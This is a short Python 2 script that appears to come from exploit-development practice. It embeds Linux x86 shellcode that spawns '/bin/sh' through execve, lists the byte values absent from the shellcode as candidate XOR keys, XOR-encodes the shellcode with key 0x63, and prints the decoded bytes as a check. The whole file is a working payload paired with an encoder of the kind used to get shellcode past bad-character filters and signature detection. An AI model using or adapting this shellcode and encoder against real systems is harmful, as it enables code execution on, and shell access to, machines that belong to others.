shellcode = ("\xeb\x14\x31\xc0\x99\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\xb0\x0b\xcd\x80\xe8\xe7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")

encoded = ""

bytes = [0] * 256
allowed_bytes = ""

code = ""

for x in bytearray(shellcode):
	code += '0x%02x,'%x
print "Original code(" + str(len(shellcode)) + " bytes):\n" + code

for x in bytearray(shellcode):
	bytes[x] = 1
for x in range(256):
	if bytes[x] == 0:
		allowed_bytes += '0x%02x,'%x
print "Allowed bytes for XOR:\n" + allowed_bytes

code = ""

for x in bytearray(shellcode):
	code += '0x%02x,'%(x ^ 0x63)
print "Encrypted code(" + str(len(shellcode)) + " bytes):\n" + code

encoded = ""
for x in bytearray(shellcode):
	encoded+= '0x%02x,'%(x ^ 0x63 ^ 0x63)
print "Decrypted code(" + str(len(shellcode)) + " bytes):\n" + encoded
